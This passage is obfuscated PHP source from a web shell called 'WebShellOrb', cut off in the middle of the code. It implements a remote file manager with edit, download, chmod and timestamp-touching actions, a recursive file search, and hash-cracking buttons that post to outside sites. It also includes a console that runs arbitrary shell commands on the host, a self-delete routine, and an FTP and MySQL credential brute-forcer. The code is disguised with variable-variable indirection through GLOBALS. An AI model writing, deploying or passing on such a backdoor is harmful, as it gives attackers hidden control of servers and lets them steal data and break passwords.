        echo "<tr" . (${${"GLOBALS"}["hthoifyfkl"]} ? " class=l1" : "") . "><td><input type=checkbox name=\"f[]\" value=\"" . urlencode(${${"GLOBALS"}["sberlg"]}["name"]) . "\" class=chkbx></td><td><a href=# onclick=\"" . (${${"GLOBALS"}["szfifyf"]}["type"] == "file" ? "g('FilesTools',null,'" . urlencode(${${"GLOBALS"}["sberlg"]}["name"]) . "', 'view')\">" . htmlspecialchars(${$lbmonmg}["name"]) : "g('FilesMan','" . ${$etnrnpxldmn}["path"] . "');\" " . (empty(${${"GLOBALS"}["sberlg"]}["link"]) ? "" : "title='{$f['link']}'") . "><b>[ " . htmlspecialchars(${${"GLOBALS"}["sberlg"]}["name"]) . " ]</b>") . "</a></td><td>" . (${${"GLOBALS"}["sberlg"]}["type"] == "file" ? WebShellOrbViewSize(${$dwvibzt}["size"]) : ${$mhjrxxhgopd}["type"]) . "</td><td>" . ${${"GLOBALS"}["sberlg"]}["modify"] . "</td><td>" . ${${"GLOBALS"}["zppmigmvqhk"]}["owner"] . "/" . ${$djskevnnm}["group"] . "</td><td><a href=# onclick=\"g('FilesTools',null,'" . urlencode(${${"GLOBALS"}["ccfvqihqjil"]}["name"]) . "','chmod')\">" . ${$ftzjqt}["perms"] . "</td><td><a href=\"#\" onclick=\"g('FilesTools',null,'" . urlencode(${$gnoadugbfdu}["name"]) . "', 'rename')\">R</a> <a href=\"#\" onclick=\"g('FilesTools',null,'" . urlencode(${${"GLOBALS"}["sberlg"]}["name"]) . "', 'touch')\">T</a>" . (${${"GLOBALS"}["cpticd"]}["type"] == "file" ? " <a href=\"#\" onclick=\"g('FilesTools',null,'" . urlencode(${$kjkiswjllpu}["name"]) . "', 'edit')\">E</a> <a href=\"#\" onclick=\"g('FilesTools',null,'" . urlencode(${$oxvhme}["name"]) . "', 'download')\">D</a>" : "") . "</td></tr>";
        ${${"GLOBALS"}["gayaio"]} = ${${"GLOBALS"}["gayaio"]} ? 0 : 1;
    }
    echo "<tr><td colspan=7>\n\t<input type=hidden name=a value='FilesMan'>\n\t<input type=hidden name=c value='" . htmlspecialchars($GLOBALS["cwd"]) . "'>\n\t<input type=hidden name=charset value='" . (isset($_POST["charset"]) ? $_POST["charset"] : "") . "'>\n\t<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    if (class_exists("ZipArchive")) {
        echo "<option value='zip'>Compress (zip)</option><option value='unzip' selected>Uncompress (unzip)</option>";
    }
    echo "<option value='tar'>Compress (tar.gz)</option>";
    if (!empty($_COOKIE["act"]) && @count($_COOKIE["f"])) {
        echo "<option value='paste'>Paste / Compress</option>";
    }
    echo "</select>&nbsp;";
    if (!empty($_COOKIE["act"]) && @count($_COOKIE["f"]) && ($_COOKIE["act"] == "zip" || $_COOKIE["act"] == "tar")) {
        echo "file name: <input type=text name=p2 value='WebShellOrb_" . date("Ymd_His") . "." . ($_COOKIE["act"] == "zip" ? "zip" : "tar.gz") . "'>&nbsp;";
    }
    echo "<input type='submit' value='>>'></td></tr></form></table></div>";
    WebShellOrbFooter();
}
function actionStringTools()
{
    if (!function_exists("hex2bin")) {
        function hex2bin($p)
        {
            return decbin(hexdec(${${"GLOBALS"}["vwhnmvbzmuqd"]}));
        }
    }
    if (!function_exists("binhex")) {
        function binhex($p)
        {
            return dechex(bindec(${${"GLOBALS"}["vwhnmvbzmuqd"]}));
        }
    }
    if (!function_exists("hex2ascii")) {
        function hex2ascii($p)
        {
            $uypcormetl = "r";
            ${"GLOBALS"}["oxhkemlp"] = "i";
            ${"GLOBALS"}["vfhyqqbkdp"] = "i";
            ${"GLOBALS"}["cfsbatzp"] = "r";
            ${$uypcormetl} = "";
            $wfjslxaohfdq = "i";
            for (${${"GLOBALS"}["vfhyqqbkdp"]} = 0; ${${"GLOBALS"}["oxhkemlp"]} < strLen(${${"GLOBALS"}["vwhnmvbzmuqd"]}); ${$wfjslxaohfdq} += 2) {
                ${"GLOBALS"}["jyuoooqn"] = "i";
                ${${"GLOBALS"}["mwpoytmwus"]} .= chr(hexdec(${${"GLOBALS"}["vwhnmvbzmuqd"]}[${${"GLOBALS"}["jyuoooqn"]}] . ${${"GLOBALS"}["vwhnmvbzmuqd"]}[${${"GLOBALS"}["clkuyojj"]} + 1]));
            }
            return ${${"GLOBALS"}["cfsbatzp"]};
        }
    }
    if (!function_exists("ascii2hex")) {
        function ascii2hex($p)
        {
            ${"GLOBALS"}["urkvpg"] = "i";
            ${"GLOBALS"}["vbhdcqxgmn"] = "r";
            ${"GLOBALS"}["iwcssnxthc"] = "r";
            $ottwxohxvz = "i";
            $egrmdhvku = "i";
            ${"GLOBALS"}["pqrjnni"] = "i";
            ${${"GLOBALS"}["vbhdcqxgmn"]} = "";
            for (${${"GLOBALS"}["urkvpg"]} = 0; ${${"GLOBALS"}["pqrjnni"]} < strlen(${${"GLOBALS"}["vwhnmvbzmuqd"]}); ++${$ottwxohxvz}) {
                ${${"GLOBALS"}["mwpoytmwus"]} .= sprintf("%02X", ord(${${"GLOBALS"}["vwhnmvbzmuqd"]}[${$egrmdhvku}]));
            }
            return strtoupper(${${"GLOBALS"}["iwcssnxthc"]});
        }
    }
    $yiuajyicz = "k";
    if (!function_exists("full_urlencode")) {
        function full_urlencode($p)
        {
            ${"GLOBALS"}["rergnurqy"] = "i";
            $fgbwesun = "i";
            ${"GLOBALS"}["vjjybnhoogs"] = "r";
            ${"GLOBALS"}["kxcfhhsnt"] = "p";
            ${"GLOBALS"}["mtlvnnw"] = "i";
            ${${"GLOBALS"}["vjjybnhoogs"]} = "";
            $vubqmofppqp = "p";
            for (${${"GLOBALS"}["mtlvnnw"]} = 0; ${${"GLOBALS"}["rergnurqy"]} < strlen(${${"GLOBALS"}["kxcfhhsnt"]}); ++${${"GLOBALS"}["clkuyojj"]}) {
                ${${"GLOBALS"}["mwpoytmwus"]} .= "%" . dechex(ord(${$vubqmofppqp}[${$fgbwesun}]));
            }
            return strtoupper(${${"GLOBALS"}["mwpoytmwus"]});
        }
    }
    ${${"GLOBALS"}["dyvthet"]} = array("Base64 encode" => "base64_encode", "Base64 decode" => "base64_decode", "Url encode" => "urlencode", "Url decode" => "urldecode", "Full urlencode" => "full_urlencode", "md5 hash" => "md5", "sha1 hash" => "sha1", "crypt" => "crypt", "CRC32" => "crc32", "ASCII to HEX" => "ascii2hex", "HEX to ASCII" => "hex2ascii", "HEX to DEC" => "hexdec", "HEX to BIN" => "hex2bin", "DEC to HEX" => "dechex", "DEC to BIN" => "decbin", "BIN to HEX" => "binhex", "BIN to DEC" => "bindec", "String to lower case" => "strtolower", "String to upper case" => "strtoupper", "Htmlspecialchars" => "htmlspecialchars", "String length" => "strlen");
    if (isset($_POST["ajax"])) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]) . "ajax", true);
        ${"GLOBALS"}["ksovovhoby"] = "temp";
        ob_start();
        if (in_array($_POST["p1"], ${${"GLOBALS"}["dyvthet"]})) {
            echo $_POST["p1"]($_POST["p2"]);
        }
        ${${"GLOBALS"}["ksovovhoby"]} = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
        echo strlen(${${"GLOBALS"}["mercgmdwe"]}), "\n", ${${"GLOBALS"}["mercgmdwe"]};
        exit;
    }
    if (empty($_POST["ajax"]) && !empty($_POST["p1"])) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]) . "ajax", 0);
    }
    WebShellOrbHeader();
    echo "<h1>String conversions</h1><div class=content>";
    echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
    foreach (${${"GLOBALS"}["dyvthet"]} as ${$yiuajyicz} => ${${"GLOBALS"}["vvdxmjbgec"]}) {
        echo "<option value='" . htmlspecialchars(${${"GLOBALS"}["vvdxmjbgec"]}) . "'>" . ${${"GLOBALS"}["oqvryxe"]} . "</option>";
    }
    echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 " . (@$_COOKIE[md5($_SERVER["HTTP_HOST"]) . "ajax"] ? "checked" : "") . "> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST["p1"]) ? "" : htmlspecialchars(@$_POST["p2"])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST["p1"]) ? "display:none;" : "") . "margin-top:5px' id='strOutput'>";
    if (!empty($_POST["p1"])) {
        ${"GLOBALS"}["iotqrbrxndx"] = "stringTools";
        if (in_array($_POST["p1"], ${${"GLOBALS"}["iotqrbrxndx"]})) {
            echo htmlspecialchars($_POST["p1"]($_POST["p2"]));
        }
    }
    echo "</pre></div><br><h1>Search files:</h1><div class=content>\n\t\t<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>\n\t\t\t<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>\n\t\t\t<tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS["cwd"]) . "' style='width:100%'></td></tr>\n\t\t\t<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>\n\t\t\t<tr><td></td><td><input type='submit' value='>>'></td></tr>\n\t\t\t</table></form>";
    function WebShellOrbRecursiveGlob($path)
    {
        $nwlnoptyz = "path";
        ${"GLOBALS"}["hgogjrkzpqhg"] = "path";
        $tucxriw = "path";
        $wdohupkfrto = "paths";
        $ethxrtpluwhs = "paths";
        if (substr(${${"GLOBALS"}["ffswlhab"]}, -1) != "/") {
            ${$tucxriw} .= "/";
        }
        ${$wdohupkfrto} = @array_unique(@array_merge(@glob(${${"GLOBALS"}["hgogjrkzpqhg"]} . $_POST["p3"]), @glob(${$nwlnoptyz} . "*", GLOB_ONLYDIR)));
        if (is_array(${${"GLOBALS"}["gigsmqyowb"]}) && @count(${$ethxrtpluwhs})) {
            ${"GLOBALS"}["upicreqkad"] = "paths";
            foreach (${${"GLOBALS"}["upicreqkad"]} as ${${"GLOBALS"}["bdmqwqvfqn"]}) {
                $qbvtxmhfia = "item";
                if (@is_dir(${$qbvtxmhfia})) {
                    ${"GLOBALS"}["cewiitv"] = "item";
                    if (${${"GLOBALS"}["ffswlhab"]} != ${${"GLOBALS"}["cewiitv"]}) {
                        WebShellOrbRecursiveGlob(${${"GLOBALS"}["bdmqwqvfqn"]});
                    }
                } else {
                    ${"GLOBALS"}["lxdqqw"] = "item";
                    if (empty($_POST["p2"]) || @strpos(file_get_contents(${${"GLOBALS"}["lxdqqw"]}), $_POST["p2"]) !== false) {
                        echo "<a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode(${${"GLOBALS"}["bdmqwqvfqn"]}) . "\", \"view\",\"\")'>" . htmlspecialchars(${${"GLOBALS"}["bdmqwqvfqn"]}) . "</a><br>";
                    }
                }
            }
        }
    }
    if (@$_POST["p3"]) {
        WebShellOrbRecursiveGlob($_POST["c"]);
    }
    echo "</div><br><h1>Search for hash:</h1><div class=content>\n\t\t<form method='post' target='_blank' name='hf'>\n\t\t\t<input type='text' name='hash' style='width:200px;'><br>\n            <input type='hidden' name='act' value='find'/>\n\t\t\t<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>\n\t\t\t<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>\n            <input type='button' value='crackfor.me' onclick=\"document.hf.action='http://crackfor.me/index.php';document.hf.submit()\"><br>\n\t\t</form></div>";
    WebShellOrbFooter();
}
function actionFilesTools()
{
    ${"GLOBALS"}["cyeedimdkbm"] = "uid";
    $sfgrxg = "v";
    ${"GLOBALS"}["wfalbmw"] = "m";
    if (isset($_POST["p1"])) {
        $_POST["p1"] = urldecode($_POST["p1"]);
    }
    ${"GLOBALS"}["yhocee"] = "i";
    $ixhzma = "len";
    ${"GLOBALS"}["mslshihi"] = "v";
    if (@$_POST["p2"] == "download") {
        if (@is_file($_POST["p1"]) && @is_readable($_POST["p1"])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=" . basename($_POST["p1"]));
            if (function_exists("mime_content_type")) {
                ${${"GLOBALS"}["vxhdoihqlkd"]} = @mime_content_type($_POST["p1"]);
                header("Content-Type: " . ${${"GLOBALS"}["vxhdoihqlkd"]});
            } else {
                header("Content-Type: application/octet-stream");
            }
            ${${"GLOBALS"}["tbrhqbi"]} = @fopen($_POST["p1"], "r");
            if (${${"GLOBALS"}["tbrhqbi"]}) {
                ${"GLOBALS"}["fiqenihpmo"] = "fp";
                ${"GLOBALS"}["fkmsxvf"] = "fp";
                while (!@feof(${${"GLOBALS"}["fiqenihpmo"]})) {
                    echo @fread(${${"GLOBALS"}["tbrhqbi"]}, 1024);
                }
                fclose(${${"GLOBALS"}["fkmsxvf"]});
            }
        }
        exit;
    }
    ${"GLOBALS"}["fcmlcpm"] = "v";
    if (@$_POST["p2"] == "mkfile") {
        if (!file_exists($_POST["p1"])) {
            $yacaqadof = "fp";
            ${${"GLOBALS"}["tbrhqbi"]} = @fopen($_POST["p1"], "w");
            if (${$yacaqadof}) {
                ${"GLOBALS"}["ndtxauj"] = "fp";
                $_POST["p2"] = "edit";
                fclose(${${"GLOBALS"}["ndtxauj"]});
            }
        }
    }
    WebShellOrbHeader();
    ${"GLOBALS"}["gnlcurqo"] = "gid";
    echo "<h1>File tools</h1><div class=content>";
    if (!file_exists(@$_POST["p1"])) {
        echo "File not exists";
        WebShellOrbFooter();
        return;
    }
    ${${"GLOBALS"}["cyeedimdkbm"]} = @posix_getpwuid(@fileowner($_POST["p1"]));
    ${"GLOBALS"}["zoezishs"] = "c";
    $vuqevyb = "i";
    $xieybe = "h";
    if (!${${"GLOBALS"}["gkjyrzxng"]}) {
        $krhueyipvqu = "gid";
        ${${"GLOBALS"}["gkjyrzxng"]}["name"] = @fileowner($_POST["p1"]);
        ${$krhueyipvqu}["name"] = @filegroup($_POST["p1"]);
    } else {
        ${${"GLOBALS"}["elkyxmiyu"]} = @posix_getgrgid(@filegroup($_POST["p1"]));
    }
    ${"GLOBALS"}["xagkiumizbm"] = "n";
    ${"GLOBALS"}["dlhdsyobutdy"] = "fp";
    echo "<span>Name:</span> " . htmlspecialchars(@basename($_POST["p1"])) . " <span>Size:</span> " . (is_file($_POST["p1"]) ? WebShellOrbViewSize(filesize($_POST["p1"])) : "-") . " <span>Permission:</span> " . WebShellOrbPermsColor($_POST["p1"]) . " <span>Owner/Group:</span> " . ${${"GLOBALS"}["gkjyrzxng"]}["name"] . "/" . ${${"GLOBALS"}["gnlcurqo"]}["name"] . "<br>";
    echo "<span>Change time:</span> " . date("Y-m-d H:i:s", filectime($_POST["p1"])) . " <span>Access time:</span> " . date("Y-m-d H:i:s", fileatime($_POST["p1"])) . " <span>Modify time:</span> " . date("Y-m-d H:i:s", filemtime($_POST["p1"])) . "<br><br>";
    $jkomyhk = "c";
    if (empty($_POST["p2"])) {
        $_POST["p2"] = "view";
    }
    if (is_file($_POST["p1"])) {
        ${${"GLOBALS"}["wfalbmw"]} = array("View", "Highlight", "Download", "Hexdump", "Edit", "Chmod", "Rename", "Touch");
    } else {
        ${${"GLOBALS"}["fskqowyovpk"]} = array("Chmod", "Rename", "Touch");
    }
    foreach (${${"GLOBALS"}["fskqowyovpk"]} as ${${"GLOBALS"}["vvdxmjbgec"]}) {
        echo "<a href=# onclick=\"g(null,null,'" . urlencode($_POST["p1"]) . "','" . strtolower(${${"GLOBALS"}["fcmlcpm"]}) . "')\">" . (strtolower(${$sfgrxg}) == @$_POST["p2"] ? "<b>[ " . ${${"GLOBALS"}["mslshihi"]} . " ]</b>" : ${${"GLOBALS"}["vvdxmjbgec"]}) . "</a> ";
    }
    ${"GLOBALS"}["ckssowbw"] = "fp";
    echo "<br><br>";
    switch ($_POST["p2"]) {
        case "view":
            echo "<pre class=ml1>";
            ${${"GLOBALS"}["tbrhqbi"]} = @fopen($_POST["p1"], "r");
            if (${${"GLOBALS"}["dlhdsyobutdy"]}) {
                ${"GLOBALS"}["gfdlnkicwrc"] = "fp";
                $pzihhtxvna = "fp";
                while (!@feof(${${"GLOBALS"}["gfdlnkicwrc"]})) {
                    echo htmlspecialchars(@fread(${$pzihhtxvna}, 1024));
                }
                @fclose(${${"GLOBALS"}["tbrhqbi"]});
            }
            echo "</pre>";
            break;
        case "highlight":
            if (@is_readable($_POST["p1"])) {
                echo "<div class=ml1 style=\"background-color: #e1e1e1;color:black;\">";
                ${"GLOBALS"}["wwzweuj"] = "code";
                ${"GLOBALS"}["djpffjy"] = "code";
                ${${"GLOBALS"}["wwzweuj"]} = @highlight_file($_POST["p1"], true);
                echo str_replace(array("<span ", "</span>"), array("<font ", "</font>"), ${${"GLOBALS"}["djpffjy"]}) . "</div>";
            }
            break;
        case "chmod":
            if (!empty($_POST["p3"])) {
                $nerjtgakmkl = "perms";
                ${"GLOBALS"}["lwnljwozvvfm"] = "i";
                $tmvoqwqnvp = "perms";
                $djwprjghcfev = "i";
                ${$nerjtgakmkl} = 0;
                for (${${"GLOBALS"}["clkuyojj"]} = strlen($_POST["p3"]) - 1; ${${"GLOBALS"}["lwnljwozvvfm"]} >= 0; --${${"GLOBALS"}["clkuyojj"]}) {
                    ${$tmvoqwqnvp} += (int) $_POST["p3"][${${"GLOBALS"}["clkuyojj"]}] * pow(8, strlen($_POST["p3"]) - ${$djwprjghcfev} - 1);
                }
                if (!@chmod($_POST["p1"], ${${"GLOBALS"}["bgbndglw"]})) {
                    echo "Can't set permissions!<br><script>document.mf.p3.value=\"\";</script>";
                }
            }
            clearstatcache();
            echo "<script>p3_=\"\";</script><form onsubmit=\"g(null,null,'" . urlencode($_POST["p1"]) . "',null,this.chmod.value);return false;\"><input type=text name=chmod value=\"" . substr(sprintf("%o", fileperms($_POST["p1"])), -4) . "\"><input type=submit value=\">>\"></form>";
            break;
        case "edit":
            if (!is_writable($_POST["p1"])) {
                echo "File isn't writeable";
                break;
            }
            if (!empty($_POST["p3"])) {
                ${"GLOBALS"}["tkmoymxtco"] = "fp";
                $oixcyn = "time";
                ${$oixcyn} = @filemtime($_POST["p1"]);
                $_POST["p3"] = substr($_POST["p3"], 1);
                ${${"GLOBALS"}["tkmoymxtco"]} = @fopen($_POST["p1"], "w");
                if (${${"GLOBALS"}["tbrhqbi"]}) {
                    @fwrite(${${"GLOBALS"}["tbrhqbi"]}, $_POST["p3"]);
                    $klfedf = "time";
                    @fclose(${${"GLOBALS"}["tbrhqbi"]});
                    echo "Saved!<br><script>p3_=\"\";</script>";
                    @touch($_POST["p1"], ${$klfedf}, ${${"GLOBALS"}["rifohoju"]});
                }
            }
            echo "<form onsubmit=\"g(null,null,'" . urlencode($_POST["p1"]) . "',null,'1'+this.text.value);return false;\"><textarea name=text class=bigarea>";
            ${${"GLOBALS"}["ckssowbw"]} = @fopen($_POST["p1"], "r");
            if (${${"GLOBALS"}["tbrhqbi"]}) {
                $nfmitia = "fp";
                while (!@feof(${${"GLOBALS"}["tbrhqbi"]})) {
                    echo htmlspecialchars(@fread(${${"GLOBALS"}["tbrhqbi"]}, 1024));
                }
                @fclose(${$nfmitia});
            }
            echo "</textarea><input type=submit value=\">>\"></form>";
            break;
        case "hexdump":
            ${${"GLOBALS"}["zoezishs"]} = @file_get_contents($_POST["p1"]);
            ${${"GLOBALS"}["xagkiumizbm"]} = 0;
            ${${"GLOBALS"}["aihxtguj"]} = array("00000000<br>", "", "");
            ${${"GLOBALS"}["srhpuno"]} = strlen(${$jkomyhk});
            for (${${"GLOBALS"}["yhocee"]} = 0; ${$vuqevyb} < ${$ixhzma}; ++${${"GLOBALS"}["clkuyojj"]}) {
                $thmyniq = "h";
                ${"GLOBALS"}["rxjppyj"] = "c";
                $zwhvop = "i";
                $nhqwejrynrqs = "h";
                $nvtehletxkg = "c";
                $ifdzzuwde = "h";
                ${$ifdzzuwde}[1] .= sprintf("%02X", ord(${$nvtehletxkg}[${$zwhvop}])) . " ";
                ${"GLOBALS"}["oxuermmp"] = "h";
                $hyxbwfpurqe = "h";
                switch (ord(${${"GLOBALS"}["sbuwwkozt"]}[${${"GLOBALS"}["clkuyojj"]}])) {
                    case 0:
                        ${${"GLOBALS"}["oxuermmp"]}[2] .= " ";
                        break;
                    case 9:
                        ${$thmyniq}[2] .= " ";
                        break;
                    case 10:
                        ${$nhqwejrynrqs}[2] .= " ";
                        break;
                    case 13:
                        ${${"GLOBALS"}["aihxtguj"]}[2] .= " ";
                        break;
                    default:
                        ${$hyxbwfpurqe}[2] .= ${${"GLOBALS"}["rxjppyj"]}[${${"GLOBALS"}["clkuyojj"]}];
                        break;
                }
                ${${"GLOBALS"}["onmdrx"]}++;
                if (${${"GLOBALS"}["onmdrx"]} == 32) {
                    ${${"GLOBALS"}["onmdrx"]} = 0;
                    $evxodxyjwete = "h";
                    $fvknjtlk = "len";
                    if (${${"GLOBALS"}["clkuyojj"]} + 1 < ${$fvknjtlk}) {
                        ${"GLOBALS"}["pnpkwrztoyz"] = "h";
                        ${${"GLOBALS"}["pnpkwrztoyz"]}[0] .= sprintf("%08X", ${${"GLOBALS"}["clkuyojj"]} + 1) . "<br>";
                    }
                    ${$evxodxyjwete}[1] .= "<br>";
                    ${${"GLOBALS"}["aihxtguj"]}[2] .= "\n";
                }
            }
            echo "<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style=\"font-weight: normal;\"><pre>" . ${${"GLOBALS"}["aihxtguj"]}[0] . "</pre></span></td><td bgcolor=#282828><pre>" . ${$xieybe}[1] . "</pre></td><td bgcolor=#333333><pre>" . htmlspecialchars(${${"GLOBALS"}["aihxtguj"]}[2]) . "</pre></td></tr></table>";
            break;
        case "rename":
            if (!empty($_POST["p3"])) {
                if (!@rename($_POST["p1"], $_POST["p3"])) {
                    echo "Can't rename!<br>";
                } else {
                    die("<script>g(null,null,\"" . urlencode($_POST["p3"]) . "\",null,\"\")</script>");
                }
            }
            echo "<form onsubmit=\"g(null,null,'" . urlencode($_POST["p1"]) . "',null,this.name.value);return false;\"><input type=text name=name value=\"" . htmlspecialchars($_POST["p1"]) . "\"><input type=submit value=\">>\"></form>";
            break;
        case "touch":
            if (!empty($_POST["p3"])) {
                ${"GLOBALS"}["lkzxojbx"] = "time";
                ${${"GLOBALS"}["lkzxojbx"]} = strtotime($_POST["p3"]);
                if (${${"GLOBALS"}["rifohoju"]}) {
                    $mhwnuhbbl = "time";
                    if (!touch($_POST["p1"], ${$mhwnuhbbl}, ${${"GLOBALS"}["rifohoju"]})) {
                        echo "Fail!";
                    } else {
                        echo "Touched!";
                    }
                } else {
                    echo "Bad time format!";
                }
            }
            clearstatcache();
            echo "<script>p3_=\"\";</script><form onsubmit=\"g(null,null,'" . urlencode($_POST["p1"]) . "',null,this.touch.value);return false;\"><input type=text name=touch value=\"" . date("Y-m-d H:i:s", @filemtime($_POST["p1"])) . "\"><input type=submit value=\">>\"></form>";
            break;
    }
    echo "</div>";
    WebShellOrbFooter();
}
function actionConsole()
{
    if (!empty($_POST["p1"]) && !empty($_POST["p2"])) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]) . "stderr_to_out", true);
        $_POST["p1"] .= " 2>&1";
    } elseif (!empty($_POST["p1"])) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]) . "stderr_to_out", 0);
    }
    if (isset($_POST["ajax"])) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]) . "ajax", true);
        ob_start();
        echo "d.cf.cmd.value='';\n";
        ${${"GLOBALS"}["mercgmdwe"]} = @iconv($_POST["charset"], "UTF-8", addcslashes("\n\$ " . $_POST["p1"] . "\n" . WebShellOrbEx($_POST["p1"]), "\n\r\t\\'\0"));
        if (preg_match("!.*cd\\s+([^;]+)\$!", $_POST["p1"], ${${"GLOBALS"}["khtkbtbcp"]})) {
            ${"GLOBALS"}["mcbiqyqu"] = "match";
            if (@chdir(${${"GLOBALS"}["mcbiqyqu"]}[1])) {
                $GLOBALS["cwd"] = @getcwd();
                echo "c_='" . $GLOBALS["cwd"] . "';";
            }
        }
        echo "d.cf.output.value+='" . ${${"GLOBALS"}["mercgmdwe"]} . "';";
        ${"GLOBALS"}["ecgpnycjo"] = "temp";
        echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
        $dkkkes = "temp";
        ${${"GLOBALS"}["mercgmdwe"]} = ob_get_clean();
        echo strlen(${${"GLOBALS"}["ecgpnycjo"]}), "\n", ${$dkkkes};
        exit;
    }
    if (empty($_POST["ajax"]) && !empty($_POST["p1"])) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]) . "ajax", 0);
    }
    WebShellOrbHeader();
    echo "<script>\nif(window.Event) window.captureEvents(Event.KEYDOWN);\nvar cmds = new Array('');\nvar cur = 0;\nfunction kp(e) {\n\tvar n = (window.Event) ? e.which : e.keyCode;\n\tif(n == 38) {\n\t\tcur--;\n\t\tif(cur>=0)\n\t\t\tdocument.cf.cmd.value = cmds[cur];\n\t\telse\n\t\t\tcur++;\n\t} else if(n == 40) {\n\t\tcur++;\n\t\tif(cur < cmds.length)\n\t\t\tdocument.cf.cmd.value = cmds[cur];\n\t\telse\n\t\t\tcur--;\n\t}\n}\nfunction add(cmd) {\n\tcmds.pop();\n\tcmds.push(cmd);\n\tcmds.push('');\n\tcur = cmds.length-1;\n}\n</script>";
    echo "<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(d.cf.cmd.value=='clear'){d.cf.output.value='';d.cf.cmd.value='';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:'');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:'');} return false;\"><select name=alias>";
    ${"GLOBALS"}["lppivzlrtq"] = "v";
    foreach ($GLOBALS["aliases"] as ${${"GLOBALS"}["onmdrx"]} => ${${"GLOBALS"}["lppivzlrtq"]}) {
        if (${${"GLOBALS"}["vvdxmjbgec"]} == "") {
            $mtvypobd = "n";
            echo "<optgroup label=\"-" . htmlspecialchars(${$mtvypobd}) . "-\"></optgroup>";
            continue;
        }
        echo "<option value=\"" . htmlspecialchars(${${"GLOBALS"}["vvdxmjbgec"]}) . "\">" . ${${"GLOBALS"}["onmdrx"]} . "</option>";
    }
    echo "</select><input type=button onclick=\"add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:'');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:'');}\" value=\">>\"> <nobr><input type=checkbox name=ajax value=1 " . (@$_COOKIE[md5($_SERVER["HTTP_HOST"]) . "ajax"] ? "checked" : "") . "> send using AJAX <input type=checkbox name=show_errors value=1 " . (!empty($_POST["p2"]) || $_COOKIE[md5($_SERVER["HTTP_HOST"]) . "stderr_to_out"] ? "checked" : "") . "> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style=\"border-bottom:0;margin:0;\" readonly>";
    if (!empty($_POST["p1"])) {
        echo htmlspecialchars("\$ " . $_POST["p1"] . "\n" . WebShellOrbEx($_POST["p1"]));
    }
    echo "</textarea><table style=\"border:1px solid #df5;background-color:#555;border-top:0px;\" cellpadding=0 cellspacing=0 width=\"100%\"><tr><td width=\"1%\">\$</td><td><input type=text name=cmd style=\"border:0px;width:100%;\" onkeydown=\"kp(event);\"></td></tr></table>";
    echo "</form></div><script>d.cf.cmd.focus();</script>";
    WebShellOrbFooter();
}
function actionLogout()
{
    setcookie(md5($_SERVER["HTTP_HOST"]), "", time() - 3600);
    die("bye!");
}
function actionSelfRemove()
{
    if ($_POST["p1"] == "yes") {
        if (@unlink(preg_replace("!\\(\\d+\\)\\s.*!", "", __FILE__))) {
            die("Shell removed");
        } else {
            echo "unlink error!";
        }
    }
    if ($_POST["p1"] != "yes") {
        WebShellOrbHeader();
    }
    echo "<h1>Suicide</h1><div class=content>remove the shell?<br><a href=# onclick=\"g(null,null,'yes')\">Yes</a></div>";
    WebShellOrbFooter();
}
function actionBruteforce()
{
    WebShellOrbHeader();
    if (isset($_POST["proto"])) {
        echo "<h1>Results</h1><div class=content><span>Type:</span> " . htmlspecialchars($_POST["proto"]) . " <span>Server:</span> " . htmlspecialchars($_POST["server"]) . "<br>";
        if ($_POST["proto"] == "ftp") {
            function WebShellOrbBruteForce($ip, $port, $login, $pass)
            {
                ${"GLOBALS"}["orrdncz"] = "login";
                $uznclobfyc = "pass";
                ${"GLOBALS"}["hvjfbdpewh"] = "fp";
                $dhzvzdjxb = "port";
                ${${"GLOBALS"}["tbrhqbi"]} = @ftp_connect(${${"GLOBALS"}["qelasgmoq"]}, ${$dhzvzdjxb} ? ${${"GLOBALS"}["nhegyujkbg"]} : 21);
                if (!${${"GLOBALS"}["hvjfbdpewh"]}) {
                    return false;
                }
                $dhmeygjtci = "fp";
                ${${"GLOBALS"}["ymhnnp"]} = @ftp_login(${${"GLOBALS"}["tbrhqbi"]}, ${${"GLOBALS"}["orrdncz"]}, ${$uznclobfyc});
                @ftp_close(${$dhmeygjtci});
                return ${${"GLOBALS"}["ymhnnp"]};
            }
        } elseif ($_POST["proto"] == "mysql") {
            function WebShellOrbBruteForce($ip, $port, $login, $pass)
            {
                $xzunqnw = "res";
                ${"GLOBALS"}["wrqqkvfiw"] = "port";
                ${"GLOBALS"}["nzxrekzw"] = "res";
                ${"GLOBALS"}["jhqqekpgddc"] = "login";
